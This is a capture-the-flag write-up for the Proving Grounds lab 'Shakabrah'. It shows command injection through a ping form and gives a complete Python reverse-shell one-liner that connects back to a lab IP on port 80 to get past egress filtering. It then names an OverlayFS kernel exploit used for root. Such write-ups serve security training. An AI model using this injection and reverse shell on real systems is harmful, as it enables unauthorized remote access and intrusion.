* * *
 ### LAB: SHAKABRAH
 ### PLATFORM: PROVING GROUNDS
* * *

### Enumeration:
- Rustscan's details

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d4137a85-bd12-48cf-bdbe-8a90aefac3be)

- I did not fuzz for directories because the index page allows users to ping an ip address with the linux ping tool,I sensed that it
might be using the php `system() method`,we can use it to our advantage by closing the ping statement with a semicolon and executing a rev shell e.g `;ls`

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3eed71ac-bfa3-46e0-9237-d02570cd72a9)

- Popping a rev shell was bit tough because the server filters connectionn on other ports,I had to pop a shell through via port 80 to bypass the firewall restriction
 `;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.214",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

- Now we have stabilizd rev shell

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/81c2962b-0f7a-4659-b513-264aa01e7c1e)

 ### PRIVESC

 -  I was able to escalate privileges with the Overlayfs kernel exploit because of the vulnerable Ubuntu version

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/05756031-0299-44c7-b6b0-09d64ce4cc95)

- Root access
  
